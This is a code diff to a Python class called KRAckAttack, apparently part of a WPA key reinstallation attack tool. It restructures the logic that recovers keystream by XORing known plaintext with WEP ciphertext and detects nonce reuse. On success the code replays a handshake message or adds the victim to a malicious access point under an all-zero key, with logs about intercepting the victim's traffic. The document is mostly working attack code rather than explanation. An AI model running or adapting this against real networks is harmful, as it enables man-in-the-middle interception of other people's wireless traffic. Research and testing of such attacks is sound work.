@@ -324,37 +324,36 @@ class KRAckAttack():
 			plaintext = "\xaa\xaa\x03\x00\x00\x00"
 			encrypted = p[Dot11WEP].wepdata[4:-4]
 			keystream = xorstr(plaintext, encrypted)
+
+			iv = dot11_get_iv(p)
+			if iv <= 1: log(STATUS, "Ciphertext: " + encrypted, showtime=False)
+
+			if client.is_iv_reused(iv):
+				# If the same keystream is reused, we have a normal key reinstallation attack
+				if keystream == client.get_keystream(iv):
+					log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
+					client.update_state(ClientState.Success_Reinstalled)
+					self.sock_real.send(client.msg4, True, self.netconfig.real_channel)
+
+				# Otherwise the client likely installed a new key, i.e., probably an all-zero key
+				else:
+					# TODO: We can explicitly try to decrypt it using an all-zero key
+					log(STATUS, "SUCCESS! Nonce reuse detected (IV=%d), with usage of all-zero encryption key." % iv, color="green", showtime=False)
+					log(STATUS, "Now MitM'ing the victim using our malicious AP, and interceptig its traffic.", color="green", showtime=False)
+
+					self.hostapd_add_allzero_client(client)
+
+					# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
+					client.update_state(ClientState.Success_AllzeroKey)
+
+			elif client.attack_timeout(iv):
+				log(WARNING, "KRAck Attack against %s seems to have failed" % client.macaddr)
+				client.update_state(ClientState.Failed)
+
+			client.save_iv_keystream(iv, keystream)
+
 		elif p.haslayer(Dot11CCMP):
-			plaintext = "\xaa\xaa\x03\x00\x00\x00"
-			encrypted = p[Dot11CCMP].data
-			keystream = xorstr(plaintext, bytes(encrypted))
-
-		iv = dot11_get_iv(p)
-		if iv <= 1: log(STATUS, "Ciphertext: " + encrypted, showtime=False)
-
-		if client.is_iv_reused(iv):
-			# If the same keystream is reused, we have a normal key reinstallation attack
-			if keystream == client.get_keystream(iv):
-				log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
-				client.update_state(ClientState.Success_Reinstalled)
-				self.sock_real.send(client.msg4, True, self.netconfig.real_channel)
-
-			# Otherwise the client likely installed a new key, i.e., probably an all-zero key
-			else:
-				# TODO: We can explicitly try to decrypt it using an all-zero key
-				log(STATUS, "SUCCESS! Nonce reuse detected (IV=%d), with usage of all-zero encryption key." % iv, color="green", showtime=False)
-				log(STATUS, "Now MitM'ing the victim using our malicious AP, and interceptig its traffic.", color="green", showtime=False)
-
-				self.hostapd_add_allzero_client(client)
-
-				# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
-				client.update_state(ClientState.Success_AllzeroKey)
-
-		elif client.attack_timeout(iv):
-			log(WARNING, "KRAck Attack against %s seems to have failed" % client.macaddr)
-			client.update_state(ClientState.Failed)
-
-		client.save_iv_keystream(iv, keystream)
+			print(p.show())
 
 	def handle_to_client_groupkey(self, client, p):
 		if not args.group: return False
